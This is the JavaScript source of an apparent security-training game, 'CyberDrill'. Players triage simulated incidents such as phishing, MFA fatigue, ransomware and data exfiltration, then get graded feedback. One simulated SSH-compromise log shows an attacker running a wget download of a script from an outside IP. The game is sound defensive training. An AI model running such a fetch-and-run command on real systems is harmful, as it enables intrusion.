const MODES={beginner:["Beginner / Student","Learn the basics with common, clear-cut threats.","Starter"],employee:["Employee awareness","Spot phishing, scams and risky habits at work.","Everyday"],soc:["SOC analyst","Triage alerts and make containment calls under pressure.","Advanced"]};
const S=[
{t:"Urgent payroll email",m:["beginner","employee"],sev:"Medium",src:"Mail gateway",asset:"Your inbox",tag:"Phishing (T1566)",
brief:"An email from “HR-Payroll” says your salary will be paused unless you confirm your details within the hour. It links to payr0ll-portal.xyz.",
logs:[["09:02","I","Inbound mail from hr-payroII@mail-corp.xyz"],["09:02","W","SPF fail, DKIM none"],["09:02","W","URL age: 2 days (payr0ll-portal.xyz)"],["09:03","I","Delivered to 214 mailboxes"]],
o:[["Click the link to check if it is real",0,"Clicking can load credential-harvesting pages or malware. Never test a suspicious link."],["Use the Report Phish button, then delete the email",100,"Reporting lets security block the sender and remove the mail from the other 213 inboxes."],["Forward it to colleagues to ask what they think",10,"Forwarding spreads the lure. Report it instead."],["Delete it and move on",45,"Safe for you, but nobody else is warned."]],
l:"Urgency, a lookalike domain and a request for credentials are the three classic phishing signs. Report, never click."},
{t:"Midnight MFA prompts",m:["beginner","employee"],sev:"High",src:"Identity provider",asset:"Your account",tag:"MFA fatigue (T1621)",
brief:"At 02:14 your phone shows 12 sign-in approval requests in a row. You did not try to log in.",
logs:[["02:14","I","Login attempt: user from 185.220.x.x (unknown)"],["02:14","W","MFA push #1 to device"],["02:15","W","MFA push #6, #7, #8 …"],["02:16","E","Push #12 pending, no response"]],
o:[["Approve one so the prompts stop",0,"Approving hands the attacker a live session. This is exactly what the attack is designed to make you do."],["Deny all, change your password, report to IT",100,"Correct. Someone has your password, so rotate it and let IT revoke sessions."],["Ignore your phone until morning",30,"The attacker may keep trying and you may tap Approve by mistake."],["Turn off MFA so it stops",0,"Removing MFA removes your last defence."]],
l:"Repeated unexpected prompts mean your password is already compromised. Deny, reset, report."},
{t:"USB drive in the car park",m:["beginner","employee"],sev:"Medium",src:"Physical security",asset:"Office reception",tag:"Removable media (T1091)",
brief:"You find a USB stick labelled “Salary Q4” near the entrance. Nobody is around.",
logs:[["08:41","I","Device found outside, no owner"],["08:41","W","Label suggests confidential data"],["08:42","I","No endpoint scan performed"]],
o:[["Plug it into your work PC to find the owner",0,"Rogue USB devices can auto-run malware or emulate a keyboard."],["Hand it to IT or security without plugging it in",100,"IT can inspect it on an isolated machine."],["Plug it into your home laptop instead",0,"You would put your personal data at risk too."],["Throw it in the bin",45,"Avoids infection, but security loses a chance to investigate a targeted drop."]],
l:"Never plug in unknown media. Curiosity is the attack."},
{t:"Ransomware spreading",m:["soc"],sev:"Critical",src:"EDR",asset:"FIN-WS-07 (Finance)",tag:"Impact (T1486)",
brief:"A finance workstation is renaming files to .locked and writing ransom notes. EDR sees SMB connections to 6 other hosts.",
logs:[["14:07","E","FIN-WS-07 mass rename: 3,412 files/min"],["14:07","E","Ransom note README_DECRYPT.txt written"],["14:08","W","SMB 445 outbound to 10.4.2.11-16"],["14:08","I","Backup agent last run 02:00"]],
o:[["Isolate the host via EDR and open an incident",100,"Network isolation stops the spread while keeping memory and disk evidence intact."],["Reboot the workstation",10,"A reboot destroys volatile evidence and may not stop encryption."],["Contact the attacker to negotiate",0,"Negotiation is a business decision, not a first response, and funds crime."],["Monitor for 10 minutes to learn more",15,"Every minute lets the encryption reach more shares."]],
l:"Contain first, investigate second. Isolate, preserve evidence, then escalate."},
{t:"SSH brute force succeeded",m:["soc","beginner"],sev:"High",src:"SIEM",asset:"web-prod-02",tag:"Brute force (T1110)",
brief:"4,200 failed SSH logins from one IP in 10 minutes, then a successful login for user deploy.",
logs:[["03:11","W","Failed password for deploy from 45.9.x.x ×4200"],["03:21","E","Accepted password for deploy from 45.9.x.x"],["03:22","W","sudo: deploy ran wget http://45.9.x.x/a.sh"],["03:22","I","Root cron job modified"]],
o:[["Block the IP and close the ticket",45,"Blocking helps, but the attacker is already inside and may have persistence."],["Kill sessions, disable and reset deploy, review cron and logs",100,"Correct. Contain the account, remove persistence, then scope the damage."],["Ignore it as normal internet noise",0,"A successful login after a flood is a confirmed compromise."],["Reboot the server",10,"This wipes evidence and leaves the cron job."]],
l:"Failures followed by a success is the pattern that matters. Contain, then hunt for persistence."},
{t:"CEO wire request",m:["employee","soc"],sev:"High",src:"Mail gateway",asset:"Accounts payable",tag:"Business email compromise (T1534)",
brief:"An email from the “CEO” asks accounts to wire $48,000 today and says not to discuss it. The sender address is ceo@company-corp.co.",
logs:[["11:20","W","Display name matches CEO; domain is external"],["11:20","W","Reply-To differs from From"],["11:21","I","No prior history with sender"]],
o:[["Send the wire, the CEO is senior and it is urgent",0,"Secrecy plus urgency plus a payment is the textbook BEC pattern."],["Verify by calling the CEO on a known number and report the email",100,"Out-of-band verification defeats spoofing."],["Reply to the email asking if it is real",20,"The attacker will simply confirm."],["Ask a colleague to approve it instead",30,"This spreads the risk instead of verifying."]],
l:"Verify money requests using a different channel than the one that asked."},
{t:"Large night-time data transfer",m:["soc"],sev:"Critical",src:"NetFlow",asset:"DB-CUST-01",tag:"Exfiltration (T1041)",
brief:"The customer database server has sent 8.2 GB to an unknown external IP at 03:40, an hour it never normally talks to the internet.",
logs:[["03:38","W","DB-CUST-01 new outbound dest 94.102.x.x"],["03:40","E","8.2 GB transferred over 443"],["03:41","I","Service account svc_backup used"],["03:41","W","Transfer still active"]],
o:[["Block egress to the IP, isolate the server, preserve logs",100,"Stops the leak and keeps evidence for forensics and breach notification."],["Delete logs so the data cannot be traced",0,"Destroying evidence is illegal and makes things worse."],["Email the DBA and review in the morning",25,"Data keeps leaving while you wait."],["Restart the database",10,"A restart does not stop the transfer and loses evidence."]],
l:"Stop the bleeding and keep the evidence. Legal and privacy teams need an accurate timeline."}];
const $=s=>document.querySelector(s),app=$("#app"),fk=$("#fk");
let P={pts:0,rounds:0,best:0,streak:0,snd:1};try{Object.assign(P,JSON.parse(localStorage.getItem("cd")||"{}"))}catch(e){}
const save=()=>{try{localStorage.setItem("cd",JSON.stringify(P))}catch(e){}};
let st={view:"",mode:null,inc:null,left:60,tm:null,seen:[],hint:false,opts:[],res:null,keys:[],online:false,rd:null,off:0,hintN:0,count:0,starting:0,fin:0,hbusy:0},AC,ready;

/* ================= BACKEND CONNECTION =================
   Same origin when served by the Node server (npm start).
   From file:// or VS Code Live Server it points at http://localhost:3000.
   Override with: <script>window.CYBERDRILL_API="https://your-host"</script> */
const API_BASE=window.CYBERDRILL_API!==undefined?window.CYBERDRILL_API:(location.protocol==="file:"||["5500","5501","5502"].includes(location.port)?"http://localhost:3000":"");
let TOKEN="";try{TOKEN=localStorage.getItem("cd_token")||""}catch(e){}
const esc=s=>String(s).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
async function api(path,body){const r=await fetch(API_BASE+path,{method:body?"POST":"GET",headers:{"content-type":"application/json",...(TOKEN?{authorization:"Bearer "+TOKEN}:{})},body:body?JSON.stringify(body):undefined});let j={};try{j=await r.json()}catch(e){}if(!r.ok){const er=new Error(j.error?j.error.message:"HTTP "+r.status);er.status=r.status;er.code=j.error&&j.error.code;throw er}return j}
async function apiA(path,body){try{return await api(path,body)}catch(e){if(e.status===401){TOKEN="";await login();return api(path,body)}throw e}}
function sync(u){P.pts=u.totalScore;P.best=u.bestScore;P.streak=u.streak;P.rank=u.rank;P.rounds=u.roundsPlayed;save()}
async function login(){if(TOKEN){try{return sync(await api("/api/me"))}catch(e){if(e.status!==401)throw e;TOKEN=""}}
for(let k=0;k<6;k++){const name="agent-"+Math.random().toString(36).slice(2,7);try{const r=await api("/api/users",{username:name});TOKEN=r.token;try{localStorage.setItem("cd_token",TOKEN)}catch(e){}return sync(r.user)}catch(e){if(e.code!=="USERNAME_TAKEN")throw e}}throw new Error("Could not create player")}
async function init(){try{await api("/api/health");st.count=(await api("/api/scenarios")).scenarios.length;await login();st.online=true}catch(e){st.online=false;st.err=e.message}}
function logsFrom(s){const d=new Date(),hm=String(d.getHours()).padStart(2,"0")+":"+String(d.getMinutes()).padStart(2,"0"),lv=s.severity==="critical"?"E":s.severity==="high"?"W":"I";return s.evidence.map((e,k,a)=>[hm,k===a.length-1?lv:"I",esc(e)])}
function fail(e){st.view="err";st.starting=0;st.fin=0;show(win("CONNECTION_ERROR.EXE",`<p class="head bad">LINK LOST</p><p class="dim">${esc(e.message)}</p><div class="row"><button class="key" onclick="next()">▶ Retry</button><button class="key" onclick="home()">Home</button></div>`),[["RETRY","next()"]])}

function beep(f,d=.08,t="square",v=.04,w=0){if(!P.snd)return;try{AC=AC||new(window.AudioContext||window.webkitAudioContext)();const o=AC.createOscillator(),g=AC.createGain(),n=AC.currentTime+w;o.type=t;o.frequency.value=f;g.gain.setValueAtTime(v,n);g.gain.exponentialRampToValueAtTime(.0001,n+d);o.connect(g);g.connect(AC.destination);o.start(n);o.stop(n+d)}catch(e){}}
const pad=n=>String(n).padStart(6,"0"),rank=()=>st.online&&P.rank?P.rank:(P.pts<100?"Rookie":P.pts<400?"Analyst":P.pts<900?"Threat hunter":"Incident lead");
const hdr=()=>`<div class="sb"><span>CyberDrill OS v1.0</span><span>HI ${pad(P.best)}</span><span>PTS ${P.pts}</span><span>${rank()}</span><span>Streak ${P.streak}</span></div>`;
const win=(t,b,c="")=>`<section class="win ${c}"><div class="wt"><span>■ ${t}</span><span class="q">?</span></div><div class="wb">${b}</div></section>`;
function rk(){fk.innerHTML=[["HOME","home()"],["MODES","modes()"],...st.keys,[P.snd?"SOUND ON":"SOUND OFF","tog()"]].map(k=>`<button class="key" onclick="${k[1]}">${k[0]}</button>`).join("")}
function show(h,keys){clearInterval(st.tm);app.classList.remove("on");void app.offsetWidth;app.innerHTML=hdr()+h;app.classList.add("on");st.keys=keys||[];rk();window.scrollTo(0,0)}
function tog(){P.snd=P.snd?0:1;save();rk();beep(660)}
function boot(){st.view="boot";fk.innerHTML="";app.classList.add("on");ready=init();app.innerHTML=`<div class="boot">${["CYBERDRILL OS v1.0","MEMORY CHECK ...... OK","LOADING INCIDENT DB ...... "+S.length+" FILES","THREAT ENGINE ...... ONLINE","BACKEND LINK ...... <span id=\"bk\">CHECKING</span>","READY."].map((l,i)=>`<div style="animation-delay:${i*.28}s">${l}</div>`).join("")}</div>`;ready.then(()=>{const e=$("#bk");if(e)e.textContent=st.online?"ONLINE":"OFFLINE (LOCAL MODE)"});setTimeout(()=>{if(st.view==="boot")ready.then(home)},1700)}
function home(){st.view="home";show(`<div class="hero"><p class="sub">Access level: trainee // internal use only</p><h1 class="ttl">CYBER<br>DRILL</h1><p class="lav">Decide in 60 seconds</p><button class="key big" onclick="modes()"><span class="bl">▶ START SIMULATION</span></button><p class="dim">Press enter or tap start</p></div>`+win("MISSION_BRIEFING.TXT",`<ol class="steps"><li>Read the alert on the SOC dashboard</li><li>Choose a response before the timer hits 0</li><li>Faster correct calls earn bonus points</li><li>Review why, learn, try another incident</li></ol>`)+`<div class="stats"><div><small>Incidents</small>${st.online?st.count:S.length}</div><div><small>Time limit</small>60S</div><div><small>Modes</small>3</div><div><small>Max score</small>${st.online?"150+":125}</div></div>`,[["START","modes()"]])}
function modes(){st.view="modes";show(win("SELECT_MODE.EXE",`<p class="dim">Choose your learning mode. Press 1-3.</p>`+Object.entries(MODES).map(([k,v],n)=>`<button class="li" onclick="start('${k}')"><span><span class="k">[${n+1}]</span> ${v[0]}</span><span>${v[2]}</span></button><p class="desc">${v[1]}</p>`).join("")))}
function start(m){beep(520);st.mode=m;next()}
function localNext(){const pool=S.filter(s=>s.m.includes(st.mode));let c=pool.filter(s=>!st.seen.includes(s.t));if(!c.length){st.seen=[];c=pool}
st.inc=c[Math.floor(Math.random()*c.length)];st.seen.push(st.inc.t);st.left=60;st.hint=false;st.opts=st.inc.o.map((o,i)=>({i,o})).sort(()=>Math.random()-.5);sim();st.tm=setInterval(tick,1000)}
async function next(){if(!st.online)return localNext();if(st.starting)return;st.starting=1;try{const r=await apiA("/api/rounds",{mode:st.mode});begin(r)}catch(e){fail(e)}finally{st.starting=0}}
function begin(r){st.rd=r;st.off=r.serverNow-Date.now();const c=r.scenario;
st.inc={t:esc(c.title),sev:c.severity[0].toUpperCase()+c.severity.slice(1),src:"Alert feed",asset:esc(c.category),tag:esc(c.category),brief:esc(c.briefing),logs:logsFrom(c),l:""};
st.left=Math.ceil(r.remainingMs/1000);st.hint=false;st.hintN=0;st.fin=0;st.hbusy=0;st.opts=r.options.map((o,k)=>({i:k,id:o.id,o:[esc(o.text)]}));sim();st.tm=setInterval(tick,1000)}
function sim(){st.view="sim";const n=st.inc;show(`<div class="dash">`+win("ALERT_FEED.LOG",`<span class="sev ${n.sev}">${n.sev}</span><b>${n.t}</b><div class="meta">SRC: ${n.src} // ASSET: ${n.asset}</div>`,"full")
+win("LIVE_FEED",`<div class="term">${n.logs.map((l,i)=>`<div class="${l[1]}" style="animation-delay:${i*.45}s">${l[0]} ${l[1]==="E"?"ERR ":l[1]==="W"?"WARN":"INFO"} ${l[2]}</div>`).join("")}</div>`)
+win("TIMER",`<div class="clock" id="clk">60</div><div class="seg"><i id="sg" style="width:100%"></i></div><button class="key sm" id="hb" onclick="hint()">[H] Hint -${st.online?15:10}</button>`,"tw")
+win("BRIEFING.TXT",n.brief+'<p class="lav" id="hnt" style="margin:12px 0 0"></p>',"full")+win("CHOOSE_RESPONSE.EXE",st.opts.map((x,k)=>`<button class="li opt" data-i="${x.i}" onclick="pick(${x.i})"><span class="k">[${k+1}]</span><span>${x.o[0]}</span></button>`).join(""),"full")+`</div>`)}
function tick(){st.left=st.online&&st.rd?Math.max(0,Math.ceil((st.rd.expiresAt-(Date.now()+st.off))/1000)):st.left-1;const c=$("#clk");if(!c)return clearInterval(st.tm);c.textContent=st.left;$("#sg").style.width=st.left/60*100+"%";$(".tw").className="win tw"+(st.left<=10?" crit":st.left<=20?" warn":"");if(st.left<=10&&st.left>0)beep(st.left<=3?1200:800,.05);if(st.left<=0)finish(-1)}
async function hint(){if(st.view!=="sim")return;if(!st.online)return localHint();if(st.hbusy||st.hintN>=2)return;st.hbusy=1;try{const h=await api(`/api/rounds/${st.rd.roundId}/hint`,{});st.hintN=h.hintsUsed;st.hint=true;
if(h.hint.type==="text"){$("#hnt").textContent="HINT: "+h.hint.text}else{const x=st.opts.find(o=>o.id===h.hint.optionId);const b=x&&$(`.opt[data-i="${x.i}"]`);if(b)b.disabled=true}
const hb=$("#hb");if(hb){if(h.hintsAvailable>0)hb.textContent="[H] Hint -25";else{hb.textContent="[H] No hints left";hb.disabled=true}}beep(440,.1)}catch(e){}finally{st.hbusy=0}}
function localHint(){if(st.hint||st.view!=="sim")return;const w=st.inc.o.map((o,i)=>[i,o[1]]).filter(x=>x[1]<50).sort((a,b)=>a[1]-b[1])[0];st.hint=true;$(`.opt[data-i="${w[0]}"]`).disabled=true;$("#hb").disabled=true;beep(440,.1)}
const pick=i=>finish(i);
function finish(i){if(st.view!=="sim"||st.fin)return;return st.online?onlineFinish(i):localFinish(i)}
async function onlineFinish(i){st.fin=1;clearInterval(st.tm);const body=i<0?{}:{optionId:st.opts[i].id};let x;
try{for(let k=0;;k++){try{x=await api(`/api/rounds/${st.rd.roundId}/decision`,body);break}catch(e){if(e.code==="MISSING_OPTION"&&k<3){await new Promise(r=>setTimeout(r,1000));continue}throw e}}}catch(e){return fail(e)}
const sc=x.score;sync(x.user);st.res={x,i,base:sc.base,bonus:sc.timeBonus,hp:sc.hintPenalty,mult:+(sc.difficultyMultiplier*sc.streakMultiplier).toFixed(2),total:sc.total,left:Math.round(x.remainingMs/1000),timeout:x.timedOut,nb:x.isNewHiScore&&sc.total>0};
if(x.verdict!=="incorrect"){[523,659,784,1047].forEach((f,k)=>beep(f,.12,"square",.04,k*.1))}else{beep(150,.35,"sawtooth",.05)}resultsO()}
function localFinish(i){clearInterval(st.tm);const o=st.inc.o,base=i<0?0:o[i][1],bonus=base>=60?Math.round(st.left/60*25):0,total=Math.max(0,base+bonus-(st.hint?10:0)),nb=total>P.best&&total>0;
P.pts+=total;P.rounds++;if(nb)P.best=total;P.streak=total>=60?P.streak+1:0;save();st.res={i,base,bonus,total,left:st.left,timeout:i<0,nb};
if(total>=60){[523,659,784,1047].forEach((f,k)=>beep(f,.12,"square",.04,k*.1))}else{beep(150,.35,"sawtooth",.05)}results()}
function animScore(total){const el=$("#sc"),t0=performance.now();(function f(t){const p=Math.min(1,(t-t0)/900);el.textContent=Math.round(total*(1-Math.pow(1-p,3)));if(p<1)requestAnimationFrame(f)})(t0)}
function resultsO(){st.view="res";const r=st.res,x=r.x,ok=x.verdict!=="incorrect",fb=x.feedback;
const head=r.timeout?"TIME OUT":x.verdict==="correct"?"MISSION COMPLETE":x.verdict==="partial"?"PARTIAL SUCCESS":"MISSION FAILED";
const badges=x.newBadges.length?`<p class="lav" style="margin:0 0 12px">${x.newBadges.map(b=>"★ BADGE: "+esc(b.label)).join("<br>")}</p>`:"";
show(win("RESULT.DAT",`<p class="head ${ok?"":"bad"}">${head}</p><div class="big" id="sc">0</div><div class="seg"><i style="width:${Math.min(100,r.total/150*100)}%"></i></div><p class="dim">Response ${r.base} + speed ${r.bonus}${r.hp?" - hints "+r.hp:""}${r.mult!==1?" x"+r.mult:""} // ${r.left}s left</p>${r.nb?'<p class="lav bl" style="margin:0">★ NEW HI-SCORE ★</p>':""}${badges}<div class="row"><button class="key" onclick="next()">▶ Next incident</button><button class="key" onclick="modes()">Change mode</button></div>`)
+win("ANALYSIS.TXT",x.review.map(o=>{const b=o.id===x.best.id,pk=x.chosen&&o.id===x.chosen.id;return `<div class="rev ${b?"best":""} ${pk?"pick":""}"><span class="tag">${b?"[Best response]":""} ${pk?"[Your pick]":""}</span><b>${esc(o.text)}</b>${esc(o.why)}</div>`}).join(""))
+win("LESSON_LEARNED",`<p>${esc(fb.explanation)}</p><p>${esc(fb.lesson)}</p>${fb.tip?`<p class="dim">Tip: ${esc(fb.tip)}</p>`:""}<p class="dim">${fb.source==="ai"?"AI feedback // ":""}Technique: ${st.inc.tag}</p>`),[["NEXT","next()"]]);
animScore(r.total)}
function results(){st.view="res";const r=st.res,n=st.inc,best=n.o.findIndex(o=>o[1]===100),ok=r.total>=60;
show(win("RESULT.DAT",`<p class="head ${ok?"":"bad"}">${r.timeout?"TIME OUT":ok?"MISSION COMPLETE":"MISSION FAILED"}</p><div class="big" id="sc">0</div><div class="seg"><i style="width:${Math.min(100,r.total/125*100)}%"></i></div><p class="dim">Response ${r.base} + speed ${r.bonus}${st.hint?" - hint 10":""} // ${r.left}s left</p>${r.nb?'<p class="lav bl" style="margin:0">★ NEW HI-SCORE ★</p>':""}<div class="row"><button class="key" onclick="next()">▶ Next incident</button><button class="key" onclick="modes()">Change mode</button></div>`)
+win("ANALYSIS.TXT",n.o.map((o,k)=>`<div class="rev ${k===best?"best":""} ${k===r.i?"pick":""}"><span class="tag">${k===best?"[Best response]":""} ${k===r.i?"[Your pick]":""}</span><b>${o[0]}</b>${o[2]}</div>`).join(""))
+win("LESSON_LEARNED",`<p>${n.l}</p><p class="dim">Technique: ${n.tag}</p>`),[["NEXT","next()"]]);
const el=$("#sc"),t0=performance.now();(function f(t){const p=Math.min(1,(t-t0)/900);el.textContent=Math.round(r.total*(1-Math.pow(1-p,3)));if(p<1)requestAnimationFrame(f)})(t0)}
addEventListener("keydown",e=>{const k=e.key;if(st.view==="boot")return ready.then(home);if(k==="Enter"&&document.activeElement&&document.activeElement.tagName==="BUTTON")return;
if(st.view==="home"&&k==="Enter")modes();else if(st.view==="modes"&&"123".includes(k)&&k.length===1)start(Object.keys(MODES)[k-1]);
else if(st.view==="sim"){if("1234".includes(k)&&k.length===1&&st.opts[k-1])pick(st.opts[k-1].i);else if(k==="h"||k==="H")hint()}else if(st.view==="res"&&k==="Enter")next()});
app.addEventListener("click",()=>{if(st.view==="boot")ready.then(home)});
boot();
